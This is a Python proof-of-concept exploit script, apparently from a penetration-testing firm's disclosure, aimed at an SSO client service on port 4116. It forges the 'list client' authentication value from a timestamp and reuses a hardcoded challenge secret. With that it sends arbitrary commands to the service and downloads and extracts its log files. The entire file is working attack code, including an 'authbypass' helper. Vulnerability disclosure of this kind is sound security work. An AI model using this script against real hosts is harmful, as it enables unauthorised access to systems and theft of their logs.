#!/usr/bin/env python3

########################################
#                                      #
#  RedTeam Pentesting GmbH             #
#  kontakt@redteam-pentesting.de       #
#  https://www.redteam-pentesting.de/  #
#                                      #
########################################

import socket
import base64
import binascii
import os
import hashlib
import zipfile
import io

import click


def client_from_timestamp(ping_answer: str) -> str:
    """SSO client calculates value for 'list client' call by XORing each byte of received timestamp with 0x89"""
    start = ping_answer.index("at:")
    timestamp = ping_answer[start + 3 : -2]
    xored = b""
    for b in timestamp:
        xored += (int.from_bytes(b.encode()) ^ 0x89).to_bytes()
    return base64.b64encode(xored).decode()


class WGClientHandler(object):
    BUFF_SIZE = 4096

    # hardcoded secret from SSO client for challenge response
    CHALLENGE_SECRET = binascii.unhexlify("47c4e6360586362789e0fb3a0591a50e")

    def __init__(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(5)
        self.sock.connect((host, port))

    def __enter__(self):
        return self

    def __exit__(self, type, value, traceback):
        self.sock.close()

    def recvall(self) -> bytes:
        data = b""
        while True:
            part = self.sock.recv(self.BUFF_SIZE)
            data += part
            if len(part) < self.BUFF_SIZE:
                break

        return data

    def recvn(self, n: int) -> bytes:
        data = b""
        remaining = n

        while remaining > 0:
            data += self.sock.recv(remaining)
            remaining = n - len(data)

        return data

    def __challenge_response(self, challenge: bytes):
        """challenge response is calculated by first appending a hardcoded secret value to challenge and then
        calculating the SHA1 hash"""
        return hashlib.sha1(challenge + self.CHALLENGE_SECRET).digest()

    def handshake(self):
        self.sock.sendall(b"ping client\r\n")
        ping_answer = self.recvall()
        print(ping_answer.decode().strip())

        client_hash = client_from_timestamp(ping_answer.decode())
        self.sock.sendall(f"list client {client_hash}\r\n".encode())
        print(self.recvall().decode().strip())

        challenge = os.urandom(16)
        self.sock.sendall(f"get encrypt ".encode() + challenge)
        encrypt_resp = self.recvall()
        received_resp_hash = encrypt_resp[15:]
        calculated_resp_hash = self.__challenge_response(challenge)

        if received_resp_hash != calculated_resp_hash:
            print("Incorrect challenge response received from SSO client")
            print(f"Received: {binascii.hexlify(received_resp_hash).decode()}")
            print(f"Expected: {binascii.hexlify(calculated_resp_hash).decode()}")

    def send(self, cmd: bytes):
        self.sock.sendall(cmd + b"\r\n")


@click.group()
def cli():
    pass


@cli.command()
@click.option("--host", required=True, type=str)
@click.option("--port", default=4116, type=int)
@click.argument("cmd")
def command(host: str, port: int, cmd: str):
    with WGClientHandler(host, port) as ch:
        ch.handshake()
        ch.send(cmd.encode())
        print(ch.recvall().decode().strip())


@cli.command()
@click.option("--host", required=True, type=str)
@click.option("--port", default=4116, type=int)
def logfile(host: str, port: int):
    with WGClientHandler(host, port) as ch:
        ch.handshake()
        ch.send("get log filecount".encode())
        length = int.from_bytes(ch.recvn(4), byteorder="little")
        binary_zip = ch.recvn(length)
        zf = zipfile.ZipFile(io.BytesIO(binary_zip), "r")
        print("Found files: ")
        for fileinfo in zf.infolist():
            print(f" * {fileinfo.filename}")
        zf.extractall(".")
        zf.close()


@cli.command()
@click.argument("timestamp")
def authbypass(timestamp: str):
    print(client_from_timestamp(f"{timestamp}\r\n"))


if __name__ == "__main__":
    cli()
